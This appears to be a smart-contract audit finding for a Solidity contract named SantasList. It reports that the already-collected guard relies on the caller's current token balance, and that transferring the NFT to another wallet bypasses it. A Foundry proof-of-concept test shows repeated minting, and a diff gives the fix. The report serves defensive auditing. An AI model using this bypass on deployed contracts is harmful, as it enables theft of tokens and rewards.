### [High] Already-Collected Guard Bypassed by Transferring the NFT

**Affected Files:** src/SantasList.sol

**Description**

`collectPresent` uses `balanceOf(msg.sender) > 0` to prevent double collection. Because the NFT is a standard transferable ERC721, a user can transfer their present away, dropping their balance to zero, and collect again indefinitely.

```solidity
function collectPresent() external {
@>  if (balanceOf(msg.sender) > 0) {          // only checks current balance
        revert SantasList__AlreadyCollected(); // bypassed after NFT is transferred
    }
    _mintAndIncrement();
}
```

**Impact**

- Unlimited NFT minting by any single NICE address.
- SantaToken rewards accumulate unboundedly.

**Proof of Concept**

```solidity
function test_DoubleCollectViaTransfer() public {
    vm.prank(santa);
    santasList.checkList(alice, SantasList.Status.NICE);
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    vm.prank(alice);
    santasList.collectPresent();

    vm.prank(alice);
    santasList.transferFrom(alice, aliceWallet2, 0);
    assertEq(santasList.balanceOf(alice), 0);

    vm.prank(alice);
    santasList.collectPresent();
    assertEq(santasList.balanceOf(alice), 1);
}
```

**Recommended Mitigation**

```diff
+ mapping(address => bool) private s_alreadyCollected;

  function collectPresent() external {
-     if (balanceOf(msg.sender) > 0) {
-         revert SantasList__AlreadyCollected();
-     }
+     if (s_alreadyCollected[msg.sender]) {
+         revert SantasList__AlreadyCollected();
+     }
+     s_alreadyCollected[msg.sender] = true;
      _mintAndIncrement();
  }
```

